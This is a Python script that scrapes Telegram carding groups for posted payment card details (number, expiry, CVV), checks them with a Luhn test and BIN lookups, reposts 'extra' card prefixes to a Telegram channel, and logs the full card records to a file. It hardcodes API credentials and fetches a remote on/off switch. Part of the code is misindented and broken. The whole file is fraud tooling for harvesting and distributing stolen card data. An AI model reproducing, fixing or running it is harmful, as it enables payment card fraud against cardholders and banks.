from telethon.sync import TelegramClient
from colorama import Cursor, init, Fore
from time import sleep
from luhn import *
import requests
import time
import re
import os

init()

is_on = requests.get("https://raw.githubusercontent.com/ThevenRexOff/scraper/main/status.txt").text
is_on = is_on.replace('\n','')
if is_on == "is_on":
    pass
elif is_on != "is_on":
    print(is_on)
    time.sleep(30)
    exit(0)


chat_scraped = ['@CodeNostra_Group', '@ChkBotLand', '@official_xforce', '@darkachat', '@ccasiaworld', '@xfoxa', '@xforce_group8', '@savagegroupoficial', '@binsofolimpus', '@Katsukifujiwarachk']

posting_channel = -1001538283887
parse_mode = 'html'
file_db = 'text.txt'

api_id = 20817172
api_hash = '7cff6f37eb1c4a378eacf2f5145cf950'
    print(Fore.LIGHTCYAN_EX + "\nIf you want to change your API delete api.txt.")
    ewdewde = input("\nPress enter to continue.")
    os.system('clear || cls')
print("Imputing S3xyDatabase..")

for chat in chat_scraped:
    with TelegramClient('scraper', api_id, api_hash) as client:
        client.parse_mode = parse_mode
        for message in client.iter_messages(chat):
            try:
                filtron = "[0-9]{16}[|][0-9]{1,2}[|][0-9]{2,4}[|][0-9]{3}"
                filtroa = "[0-9]{15}[|][0-9]{1,2}[|][0-9]{2,4}[|][0-9]{4}"
                detectavisa = "[0-9]{16}"
                detectamex = "[0-9]{15}"
                try:
                    sacanumvisa = re.findall(detectavisa, message.text)
                    carduno = sacanumvisa[0]
                    tipocard = str(carduno[0:1])
                except:
                    sacanumamex = re.findall(detectamex, message.text)
                    carduno = sacanumamex[0]
                    tipocard = str(carduno[0:1])

                if tipocard == "3":
                    x = re.findall(filtroa, message.text)[0]
                elif tipocard == "4":
                    x = re.findall(filtron, message.text)[0]
                elif tipocard == "5":
                    x = re.findall(filtron, 
                    message.text)[0]
                elif tipocard == "6":
                    x = re.findall(filtron, message.text)[0]

                lunh = verify(x.split("|")[0])

                extra = x[0:0+12]
                               
                bin = x[0:6]
                                                               
                bin_data = requests.get('https://www.binapi.co.uk/bin='+ x.split("|")[0][0:6]).json()
                country = bin_data['country']
                flag = bin_data['flag']
                vendor = bin_data['brand']
                tipo = bin_data['type']
                level = bin_data['level']
                bank_name = bin_data['bank']                                                     

                explode = x.split('|')
                cc = explode[0] 
                mes = explode[1] 
                ano = explode[2] 
                cvv = explode[3]


                card_send_formatted = f'''
ㅤㅤㅤ𝐍𝐞𝐰 𝐄𝐱𝐭𝐫𝐚! 鰲 (<code>#{bin}</code> ♻️)
[你] 𝐄𝐱𝐭𝐫𝐚 → <code>{extra}xxxx|{mes}|{ano}|rnd</code>
[為] 𝐁𝐢𝐧 → <code>{vendor} - {tipo} - {level} - {country} => ({flag})</code>
[奧] 𝐁𝐚𝐧𝐤 → <code>{bank_name}</code>
@ApiSites | @S3xyAlec
'''


                print(f'S3xyDrops V1.0\n   Card => {cc}\n    Date => {mes}/{ano}\n     Cvv => {cvv}\n       Author => @S3xyAlec\n\n')
                if lunh is True:
                        time.sleep(8)
                        client.send_message(posting_channel, card_send_formatted)
                        f = open(file_db, 'a')
                        f.write(f"{x}\n")
                        f.close()

            except Exception as e:
                pass
